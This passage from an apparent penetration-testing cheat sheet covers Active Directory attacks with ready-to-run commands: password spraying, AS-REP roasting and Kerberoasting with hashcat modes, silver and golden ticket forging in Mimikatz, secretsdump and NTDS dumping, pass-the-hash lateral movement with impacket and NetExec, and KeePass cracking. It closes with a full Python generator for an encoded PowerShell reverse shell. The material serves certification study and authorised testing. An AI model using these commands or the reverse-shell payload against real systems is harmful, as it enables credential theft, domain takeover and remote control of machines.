kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```
#### DeadPotato SeImpersonatePrivilege

The former machine-specific DeadPotato command had no pinned upstream build or reproducible prerequisites and has been removed. Start with [token impersonation](#token-impersonation): verify privileges, OS build, architecture and required services before selecting a tool. Creating a local administrator does not automatically grant domain access or RDP access.

#### AS-REP Roasting

Mode 18200 below applies to `$krb5asrep$23$`. AES AS-REP formats use different modes; identify the actual output before cracking.

```text
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives us the hash of AS-REP Roastable accounts, from kali linux
.\Rubeus.exe asreproast /nowrap #dumping from compromised windows host

hashcat -m 18200 hashes.txt wordlist.txt # select this mode only for the matching hash type
```

#### Kerberoasting

Mode 13100 below applies to `$krb5tgs$23$`; AES etypes 17/18 use different modes. An SPN is an enumeration finding, not a promise of a crackable password.

```text
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname

impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine

hashcat -m 13100 hashes.txt wordlist.txt # select this mode only for the matching hash type
```

#### Silver Tickets

Historical recipe: possession of a service key does not guarantee current PAC validation will accept a forged ticket. Check SPN, encryption type and target/DC patches; see [chain compatibility](../command-audit.md#recheck-every-transition-in-a-chain).

- Obtaining hash of an SPN user using **Mimikatz**

```text
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Obtaining Domain SID

```text
whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
```

- Forging silver ticket Ft **Mimikatz**

```text
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
exit

# we can check the tickets by,
klist
```

- Accessing service

```text
Invoke-WebRequest -UseBasicParsing -UseDefaultCredentials -Uri 'http://<HTTP_SERVICE_FQDN>/'
# HTTP example only: use the client/resource matching the actual SPN, e.g. SMB for CIFS.
# A Kerberos service class is not an arbitrary URI scheme; a client error does not validate or reject the ticket.
```

#### Secretsdump

```text
impacket-secretsdump <domain>/<user>:<password>@<IP>
impacket-secretsdump -hashes <LMHASH>:<NTHASH> <user>@<IP> #local user (domain omitted)
impacket-secretsdump -hashes <LMHASH>:<NTHASH> <domain>/<user>@<IP> #domain user
```

#### Dumping NTDS.dit

```text
impacket-secretsdump -just-dc-ntlm <domain>/<user>:<password>@<IP>
# Normally uses DRSUAPI replication (DCSync); requires directory replication rights. This is not a file copy of NTDS.dit.
```

### Lateral Movement in Active Directory

#### psexec - smbexec - wmiexec - atexec

- Here we can pass the credentials or even hash, depending on what we have

> Impacket expects `LMHASH:NTHASH`; if the LM half is unavailable, use `:<NTHASH>`. NetExec and Evil-WinRM also accept a bare NT hash. These formats do not accept Net-NTLMv2 challenge-response strings.
>

```text
impacket-psexec <domain>/<user>:<password>@<IP>
# Requires a writable SMB share AND permission to create/start a service; share write access alone is insufficient.

impacket-psexec -hashes <LMHASH>:<NTHASH> <domain>/<user>@<IP> <command>
#we passed full hash here

impacket-smbexec <domain>/<user>:<password>@<IP>

impacket-smbexec -hashes :<NTHASH> <domain>/<user>@<IP>
# Enter commands in the semi-interactive shell; smbexec has no trailing command argument.
#we passed full hash here

impacket-wmiexec <domain>/<user>:<password>@<IP>

impacket-wmiexec -hashes <LMHASH>:<NTHASH> <domain>/<user>@<IP> <command>
#we passed full hash here

impacket-atexec -hashes <LMHASH>:<NTHASH> <domain>/<user>@<IP> <command>
#we passed full hash here
```

#### winrs

```text
winrs -r:<computername> -u:<user> -p:<password> "command"
# run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell
# run this on windows session
```

#### NetExec

- NetExec is the maintained successor to CrackMapExec. Refer to the [official wiki](https://www.netexec.wiki/) for current protocol and option support.

```text
nxc <protocol> --help #for example: nxc smb --help
nxc smb <Rhost/range> -u user.txt -p password.txt --continue-on-success #test credential lists and continue after successes
nxc smb <Rhost/range> -u user.txt -p password.txt --no-bruteforce --continue-on-success | grep -F '[+]' #matched pairs; literal success marker
nxc smb <Rhost/range> -u user.txt -p 'password' --continue-on-success #password spraying

#Use -d <DOMAIN> for domain identities or --local-auth for a verified local account; do not switch scope blindly.
nxc smb <Rhost/range> -u 'user' -p 'password' --shares #list shares and access
nxc smb <Rhost/range> -u 'user' -p 'password' --disks #enumerate disks
nxc smb <DC-IP> -u 'user' -p 'password' --users #enumerate domain users
nxc smb <Rhost/range> -u 'user' -p 'password' --smb-sessions #enumerate active SMB sessions
nxc smb <Rhost/range> -u 'user' -p 'password' --loggedon-users #enumerate logged-on users
nxc smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dump password policy
nxc smb <Rhost/range> -u 'user' -p 'password' --sam #dump SAM hashes; requires administrative access
nxc smb <Rhost/range> -u 'user' -p 'password' --lsa #dump LSA secrets; requires administrative access
nxc smb <DC-IP> -u 'user' -p 'password' --ntds #dump NTDS data from a domain controller; requires sufficient privileges
nxc smb <Rhost/range> -u 'user' -p 'password' --groups '<groupname>' #enumerate a domain group and its members
nxc smb <Rhost/range> -u 'user' -p 'password' -x 'command' #use -x for CMD or -X for PowerShell

#Pass the hash
nxc smb <ip or range> -u username -H <NTHASH> --local-auth
#We can run all the above commands with hash and obtain more information

#NetExec modules
nxc smb -L #list SMB modules
nxc smb -M gpp_password --options #show options for an installed module
nxc smb <Rhost> -u 'user' -p 'password' -M gpp_password #run the module
```

- NetExec database

```text
nxcdb #launch the database console
help #list console commands
proto smb #select the SMB protocol database
```
#### kpcli - KeePass password manager

Download a discovered database from the relevant share, then use a format-compatible converter/cracker. See [KeePass conversion](#keepass2john) for the John label and KDBX version caveats.
```
smbclient -L //<TARGET>
# SMB console, after connecting to the share and changing to the directory:
get Database.kdbx
keepass2john Database.kdbx > keepass.hash
cut -d: -f2- keepass.hash > keepass.hashcat
hashcat -m 13400 keepass.hashcat /usr/share/wordlists/rockyou.txt # Add -r <RULE_FILE> only when that file exists.
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
```
Opening the KDBX file with a known password in kpcli (kpcli is not the cracker)
```
kpcli --kdb=Database.kdbx # Enter the recovered password at the prompt.
>ls
>cd Databases
>cd Windows
>show emma
# Use help show for your installed version; hidden output is not secure redaction.
```

#### Pass the ticket

```text
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
```

#### DCOM

DCOM execution requires a reachable RPC endpoint mapper and dynamic RPC ports, remote activation permissions, and a suitable registered COM application. Current Windows DCOM hardening can invalidate old clients. The former truncated encoded payload was not executable and has been removed.

Use the maintained [Impacket DCOM example and its installed help](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py) for supported methods. Validate access with a harmless identity check before relying on a shell.

#### Golden Ticket

Historical lab example. An arbitrary username and an old RC4-only recipe are not universally accepted on patched domains. Confirm principal, key material, encryption and PAC requirements before using the [upstream tool](https://github.com/gentilkiwi/mimikatz). See [chain compatibility](../command-audit.md#recheck-every-transition-in-a-chain).

1. Get the krbtgt hash

```text
.\mimikatz.exe
privilege::debug
#below are some ways
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::dcsync /user:krbtgt

kerberos::purge #removes any exisiting tickets

#sample command
kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698214355-4094250843 /krbtgt:4b4412bbe7b3a88f5b0537ac0d2bf296 /ticket:golden

#Saved with name "golden" here, there are other options to check as well
```

1. Obtaining access!

```text
mimikatz.exe #no need for highest privileges
kerberos::ptt golden
misc::cmd #we're accessing cmd
```

#### Shadow Copies

Historical mixed transcript: run VShadow, copy and registry commands on the Windows DC with sufficient backup/read privileges; transfer the matching NTDS and SYSTEM backups to Kali for `impacket-secretsdump`. Replace the hardcoded shadow-copy number with the actual device path returned by VShadow.

```text
vshadow.exe -nw -p C:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
### Windows PowerShell payload encoding
<a href="https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
">GitHub link</a>
<a href="https://discord.com/channels/780824470113615893/1087927556604432424/1271916461442728098"> Discord Chat</a>
```python
#!/usr/bin/env python3
#
# generate reverse powershell cmdline with base64 encoded args
#

import sys
import base64

def help():
    print("USAGE: %s IP PORT" % sys.argv[0])
    print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
    exit()

try:
    (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
    help()

# payload from Nikhil Mittal @samratashok
# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

cmdline = "powershell -e " + base64.b64encode(payload.encode('utf-16le')).decode()

print(cmdline)
```

## References

[![](https://github.com/saisathvik1.png?size=50)](https://github.com/saisathvik1)
[![](https://github.com/swisskyrepo.png?size=50)](https://github.com/swisskyrepo)
---
